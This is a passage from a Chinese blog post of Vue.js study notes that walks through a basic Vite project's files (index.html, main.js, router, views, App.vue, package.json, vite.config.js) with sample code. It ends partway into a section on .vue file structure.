content="Vue学习笔记-项目结构与文件结构分析"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-05T03:37:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户55597002510"/> <meta itemprop="url" content="https://juejin.cn/user/2051012520061929"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue学习笔记-项目结构与文件结构分析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2051012520061929/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户55597002510
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:37:36.000Z" title="Fri Dec 05 2025 03:37:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><pre><code class="hljs">📝 作者：一名 Vue 的学习者
🕒 记录时间：2025年12月
💡 目标：熟悉Vue项目结构及.vue文件结构
</code></pre>
<h2 data-id="heading-0">一、Vue项目结构</h2>
<p>在使用 <code>npm create vue@latest my-vue-app </code>命令创建最简单的vue项目后，目录文件结构如下：</p>
<pre><code class="hljs language-css" lang="css">my-vue-app/
└─ <span class="hljs-attribute">src</span>/
   ├─ assets/
   ├─ components/
   └─ router/
      └─ index<span class="hljs-selector-class">.js</span>
   ├─ views/
   ├─ <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.js</span>
   ├─ App<span class="hljs-selector-class">.vue</span>
├─ index<span class="hljs-selector-class">.html</span>
├─ package<span class="hljs-selector-class">.json</span>
├─ vite<span class="hljs-selector-class">.config</span><span class="hljs-selector-class">.js</span>
</code></pre>
<h2 data-id="heading-1">二、项目文件详解</h2>
<h3 data-id="heading-2">1、 <code>index.html</code>（页面壳子，挂载点）</h3>
<p>默认脚手架有 <code>index.html</code>。确保其中有挂载点 <code>&lt;div id="app"&gt;&lt;/div&gt;</code> 并且引入了 <code>src/main.js</code>：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>My Vue App<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"app"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/src/main.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>作用：浏览器加载此文件，<code>main.js</code> 在这里被执行，Vue 应用会挂载到 <code>div#app</code> 上。</p>
<hr/>
<h3 data-id="heading-3">2、 <code>src/main.js</code>（应用入口，创建并挂载 Vue 应用）</h3>
<p>把 <code>src/main.js</code> 改为下面内容（或确认与之相似）：</p>
<pre><code class="hljs language-javaScript" lang="javaScript"><span class="hljs-comment">// src/main.js</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">'./router'</span> <span class="hljs-comment">// 引入路由</span>
<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)
app.<span class="hljs-title function_">use</span>(router)              <span class="hljs-comment">// 注册路由（重要）</span>
app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)           <span class="hljs-comment">// 挂载到 index.html 的 div#app</span>
</code></pre>
<p>解释：<code>createApp(App)</code> 创建 Vue 应用实例，<code>app.use(router)</code> 把路由系统安装到应用，最后 <code>mount('#app')</code> 把应用渲染到 <code>index.html</code> 的挂载点。</p>
<hr/>
<h3 data-id="heading-4">3、 <code>src/router/index.js</code>（路由定义）</h3>
<p>如果你在创建项目时选择了 Router，已经存在路由文件。这里创建一个最简单的路由文件，包含两个页面（Home / About）：</p>
<pre><code class="hljs language-javaScript" lang="javaScript"><span class="hljs-comment">// src/router/index.js</span>
<span class="hljs-keyword">import</span> { createRouter, createWebHistory } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../views/Home.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">About</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../views/About.vue'</span>

<span class="hljs-comment">// 路由表</span>
<span class="hljs-keyword">const</span> routes = [
  { <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Home'</span>, <span class="hljs-attr">component</span>: <span class="hljs-title class_">Home</span> },
  { <span class="hljs-attr">path</span>: <span class="hljs-string">'/about'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'About'</span>, <span class="hljs-attr">component</span>: <span class="hljs-title class_">About</span> }
]

<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createRouter</span>({
  <span class="hljs-attr">history</span>: <span class="hljs-title function_">createWebHistory</span>(), <span class="hljs-comment">// 使用 HTML5 history 模式</span>
  routes
})

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router
</code></pre>
<p>解释：每个路由项里 <code>path</code> 是 URL，<code>component</code> 是该 URL 对应渲染的 Vue 组件。</p>
<hr/>
<h3 data-id="heading-5">4、 创建视图页面（views）</h3>
<p>在 <code>src/views/</code> 下创建两个文件：<code>Home.vue</code> 和 <code>About.vue</code>。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- src/views/Home.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page home"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>欢迎来到首页！<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Home'</span>
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.page</span> { <span class="hljs-attribute">padding</span>: <span class="hljs-number">16px</span>; }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- src/views/About.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page about"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>About<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是关于页。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'About'</span>
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.page</span> { <span class="hljs-attribute">padding</span>: <span class="hljs-number">16px</span>; }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-6">5、 <code>App.vue</code>（根组件，增加简单布局与路由出口）</h3>
<p>现在把 <code>App.vue</code> 改为一个带顶部导航与侧边栏的最简单布局，并在中间放置 <code>router-view</code>（路由的渲染位置）：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- src/App.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"app"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">header</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"topbar"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logo"</span>&gt;</span>My Vue App<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"topnav"</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 使用 router-link 进行页面跳转 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/"</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/about"</span>&gt;</span>About<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">aside</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"sidebar"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/"</span>&gt;</span>侧栏：首页<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/about"</span>&gt;</span>侧栏：关于<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">aside</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">main</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"main"</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 路由内容会渲染到这里 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">router-view</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'App'</span>
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-comment">/* 基本样式，仅做布局示例 */</span>
<span class="hljs-selector-tag">body</span>, <span class="hljs-selector-tag">html</span>, <span class="hljs-selector-id">#app</span> { <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>; <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">font-family</span>: Arial, sans-serif; }
<span class="hljs-selector-class">.topbar</span> { <span class="hljs-attribute">height</span>: <span class="hljs-number">56px</span>; <span class="hljs-attribute">background</span>:<span class="hljs-number">#35495e</span>; <span class="hljs-attribute">color</span>: white; <span class="hljs-attribute">display</span>:flex; <span class="hljs-attribute">align-items</span>:center; <span class="hljs-attribute">justify-content</span>:space-between; <span class="hljs-attribute">padding</span>:<span class="hljs-number">0</span> <span class="hljs-number">16px</span>; }
<span class="hljs-selector-class">.logo</span> { <span class="hljs-attribute">margin</span>:<span class="hljs-number">0</span>; <span class="hljs-attribute">font-size</span>:<span class="hljs-number">18px</span>; }
<span class="hljs-selector-class">.topnav</span> <span class="hljs-selector-tag">a</span> { <span class="hljs-attribute">color</span>: <span class="hljs-number">#dbe9ff</span>; <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">12px</span>; <span class="hljs-attribute">text-decoration</span>:none; }
<span class="hljs-selector-class">.container</span> { <span class="hljs-attribute">display</span>: flex; <span class="hljs-attribute">height</span>: <span class="hljs-built_in">calc</span>(<span class="hljs-number">100vh</span> - <span class="hljs-number">56px</span>); }
<span class="hljs-selector-class">.sidebar</span> { <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>; <span class="hljs-attribute">background</span>: <span class="hljs-number">#f5f7fa</span>; <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span>; <span class="hljs-attribute">box-shadow</span>: inset -<span class="hljs-number">1px</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.05</span>); }
<span class="hljs-selector-class">.main</span> { <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>; <span class="hljs-attribute">padding</span>: <span class="hljs-number">16px</span>; <span class="hljs-attribute">background</span>: <span class="hljs-number">#fff</span>; }
<span class="hljs-selector-class">.sidebar</span> <span class="hljs-selector-tag">ul</span> { <span class="hljs-attribute">list-style</span>:none; <span class="hljs-attribute">padding</span>:<span class="hljs-number">0</span>; }
<span class="hljs-selector-class">.sidebar</span> <span class="hljs-selector-tag">li</span> { <span class="hljs-attribute">margin</span>:<span class="hljs-number">8px</span> <span class="hljs-number">0</span>; }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p>解释要点：</p>
<ul>
<li><code>router-link</code> 替代 <code>&lt;a&gt;</code>，它会做前端路由跳转（无页面刷新）。</li>
<li><code>router-view</code> 是路由出口 —— 当前匹配的页面组件会被渲染到这里。</li>
<li>我做了简单的 <strong>header + sidebar + main</strong> 布局，帮助你理解常见的后台布局结构。</li>
</ul>
<hr/>
<h3 data-id="heading-7">6、 package.json</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"my-vue-app"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"0.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"private"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"module"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"engines"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"node"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^20.19.0 || &gt;=22.12.0"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"dev"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite build"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build:prod"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite build --mode production"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build:analyze"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite build --analyze"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build:report"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite build &amp;&amp; npx vite-bundle-analyzer dist"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"preview"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite preview"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"axios"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^1.13.2"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"echarts"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^6.0.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"element-plus"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^2.11.7"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"pinia"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^3.0.3"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"vue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^3.5.22"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"vue-router"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.6.3"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"@vitejs/plugin-vue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^6.0.1"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"vite"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^7.1.11"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"vite-plugin-vue-devtools"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^8.0.3"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>主要配置项目名称，定义项目所需框架、版本信息等,我这里主要引入下面这些组件:<br/>
<code>vue</code>：3.5.2<br/>
<code>element-plus</code>：基于vue的UI框架<br/>
<code>axios</code>：主要负责网络请求<br/>
<code>echarts</code>：图表展示框架</p>
<h3 data-id="heading-8">7、 vite.config.js</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>(<span class="hljs-function">(<span class="hljs-params">{ mode, command }</span>) =&gt;</span> {
    <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">plugins</span>: [<span class="hljs-title function_">vue</span>()],
        <span class="hljs-attr">resolve</span>: {
            <span class="hljs-attr">alias</span>: {
                <span class="hljs-string">'@'</span>: <span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'./src'</span>, <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>))
            },
        },
        <span class="hljs-attr">server</span>: {
            <span class="hljs-attr">port</span>: <span class="hljs-number">5173</span>, <span class="hljs-comment">// 设置开发服务器端口</span>
            <span class="hljs-attr">host</span>: <span class="hljs-string">'0.0.0.0'</span>, <span class="hljs-comment">// 允许外部访问</span>
            <span class="hljs-attr">open</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 启动时自动打开浏览器</span>
            <span class="hljs-attr">proxy</span>: {}
        }
    }
})
</code></pre>
<p>定义本地启动端口等相关信息，打包方式等！</p>
<h3 data-id="heading-9">8、 运行并查看效果</h3>
<pre><code class="hljs language-bash" lang="bash">    npm run dev
</code></pre>
<p>打开浏览器访问终端给出的地址（通常 <code>http://localhost:5173</code>），同时我们也可以在<code>vite.config.js</code>中修改端口。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dbffc2d0885c49949f018193a11e5791~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NTU1OTcwMDI1MTA=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510656&amp;x-signature=ftmqaZKpG4aK%2Bg4PFReNDqIp5gw%3D" alt="" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-10">三、.vue文件结构</h2>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- src/views/AboutView.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h3 data-id="heading-11">1. <code>&lt;template&gt;</code> 组件的 HTML 结构（UI）</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page about"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>About<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
